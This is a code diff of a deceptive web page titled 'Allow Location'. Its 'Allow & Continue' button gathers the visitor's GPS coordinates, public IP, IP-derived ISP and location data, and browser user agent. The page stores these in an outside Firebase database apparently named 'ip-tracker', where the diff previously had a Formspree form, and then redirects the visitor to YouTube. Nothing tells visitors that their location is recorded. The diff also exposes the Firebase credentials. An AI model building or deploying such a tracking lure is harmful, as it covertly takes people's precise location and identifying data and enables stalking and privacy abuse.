@@ -1,12 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Allow Location</title>
   <style>
-    body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
-    button { padding: 12px 24px; font-size: 16px; border-radius: 5px; border: none; background: #2196f3; color: white; cursor: pointer; }
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding: 50px;
+      background: #f4f4f4;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 5px;
+      border: none;
+      background: #2196f3;
+      color: white;
+      cursor: pointer;
+    }
   </style>
+
+  <!-- Firebase CDN -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 </head>
 <body>
   <h2>📍 Please allow location access</h2>
@@ -14,9 +31,26 @@
   <button onclick="startTracking()">Allow & Continue</button>
 
   <script>
+    // Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyD7-mS804xPfoS8pJnboMpsbZGFrHEIcVk",
+      authDomain: "ip-tracker-d63e1.firebaseapp.com",
+      projectId: "ip-tracker-d63e1",
+      storageBucket: "ip-tracker-d63e1.appspot.com",
+      messagingSenderId: "978015386276",
+      appId: "1:978015386276:web:418573d8546b922b974431",
+      measurementId: "G-SZB4ZMG0V3"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Get GPS Coordinates with permission handling
     async function getGeoCoords() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) {
+          alert("Your browser does not support Geolocation.");
           resolve({ latitude: "Not supported", longitude: "Not supported" });
         } else {
           navigator.geolocation.getCurrentPosition(
@@ -27,6 +61,7 @@
               });
             },
             error => {
+              alert("Location permission denied. Please allow location access.");
               resolve({ latitude: "Permission denied", longitude: "Permission denied" });
             },
             { timeout: 10000 }
@@ -35,21 +70,22 @@
       });
     }
 
+    // Main function
     async function startTracking() {
       try {
-        // IP
+        // ✅ Step 1: Get GPS location first (triggers browser permission popup)
+        const gps = await getGeoCoords();
+
+        // Step 2: Fetch public IP
         const ipRes = await fetch('https://api64.ipify.org?format=json');
         const ipJson = await ipRes.json();
         const ip = ipJson.ip;
 
-        // Location via IP
+        // Step 3: Get location info via IP
         const locRes = await fetch(`https://ipwhois.app/json/${ip}`);
         const locData = await locRes.json();
 
-        // GPS
-        const gps = await getGeoCoords();
-
-        // Final data
+        // Step 4: Prepare and send data
         const data = {
           ip: ip,
           isp: locData.org || 'N/A',
@@ -59,20 +95,24 @@
           timezone: locData.timezone || 'N/A',
           latitude: gps.latitude,
           longitude: gps.longitude,
-          user_agent: navigator.userAgent
+          user_agent: navigator.userAgent,
+          timestamp: new Date().toISOString()
         };
 
-        // Send to Formspree
-        await fetch("https://formspree.io/f/mldnbqvo", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
+        console.log("Data to save:", data);
+
+        // Save to Firebase
+        await db.ref("visitors").push(data);
+        console.log("Data saved successfully to Firebase.");
 
       } catch (err) {
         console.error("Tracking error:", err);
+        alert("Error occurred while tracking your location.");
       } finally {
-        window.location.href = "https://youtube.com"; // ✅ redirect works
+        // Redirect after 2 seconds
+        setTimeout(() => {
+          window.location.href = "https://youtube.com";
+        }, 2000);
       }
     }
   </script>
